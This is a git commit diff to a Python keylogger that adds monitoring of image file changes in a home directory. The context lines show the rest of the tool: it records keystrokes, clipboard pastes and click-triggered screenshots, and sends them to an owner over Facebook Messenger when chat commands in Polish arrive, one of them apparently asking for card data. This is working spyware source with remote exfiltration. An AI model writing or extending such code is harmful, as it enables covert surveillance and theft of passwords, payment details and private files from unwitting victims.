ff85fc405ccb3ad9ee04577586cd8792db17cdff
Marcin Szachun <mszachun@gmail.com>
2016-12-01 23:59:54 +0100

    Watch home folder for image file changes

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,16 @@
 import os
 
 import glob
+import re
 import keyboard
 from keyboard import mouse
 import pyscreenshot
 from PIL import ImageDraw
 import pymouse
 import fbchat
+from watchdog.observers import Observer
+from watchdog.events import RegexMatchingEventHandler
+from Queue import Queue
 
 
 class FacebookController(fbchat.Client):
@@ -26,19 +30,35 @@ class FacebookController(fbchat.Client):
             for screenshot in self.keylogger.get_saved_screenshots():
                 self.sendLocalImage(self.owner_uid, message='to widzialem: {}'.format(screenshot), image=screenshot)
             self.keylogger.reset_screenshot_directory()
-        if message == 'logs':
+        if 'karta' in message:
             self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))
 
         if 'schowek' in message:
             self.keylogger.toggle_clipboard_capturing()
         if 'schowku' in message:
             self.send_to_owner('\n'.join(self.keylogger.flush_captured_clipboard()))
+        if 'pliki' in message:
+            self.send_to_owner('\n'.join(self.keylogger.flush_file_events()))
+
+
+class HomeDirectoryImageWatcher(RegexMatchingEventHandler):
+    regexes = [re.compile('.*png$'), re.compile('.*svg$')]
+    ignore_regexes = [re.compile(r'.*\..{4,}.*')]
+
+    def __init__(self, keylogger, *args, **kwargs):
+        self.keylogger = keylogger
+
+        super(HomeDirectoryImageWatcher, self).__init__(*args, **kwargs)
+
+    def on_any_event(self, event):
+        self.keylogger.add_file_event(event.src_path)
 
 
 class Keylogger(object):
     def __init__(self):
         self.captured_keys = []
         self.captured_pasting = []
+        self.file_events = Queue()
         self.capture_screenshots_on_click = False
         self.clipboard_capturing = False
         self.previous_clipboard_content = ''
@@ -48,6 +68,13 @@ class Keylogger(object):
         keyboard.on_press(self._on_key_press)
         keyboard.add_hotkey('ctrl+v', self._on_paste)
         keyboard.mouse.hook(self._on_left_mouse_button_click)
+
+        self._enable_home_directory_watching()
+
+    def _enable_home_directory_watching(self):
+        observer = Observer()
+        observer.schedule(HomeDirectoryImageWatcher(self), path='/home/szacun/', recursive=True)
+        observer.start()
 
     def toggle_screenshots_capturing(self):
         self.capture_screenshots_on_click = not self.capture_screenshots_on_click
@@ -62,6 +89,17 @@ class Keylogger(object):
     def flush_captured_clipboard(self):
         captured_clipboard, self.captured_pasting = self.captured_pasting, []
         return captured_clipboard
+
+    def flush_file_events(self):
+        events = set()
+
+        while not self.file_events.empty():
+            events.add(self.file_events.get())
+
+        return events
+
+    def add_file_event(self, file_path):
+        self.file_events.put(file_path)
 
     def get_saved_screenshots(self):
         return glob.glob('/tmp/screen*.jpg')
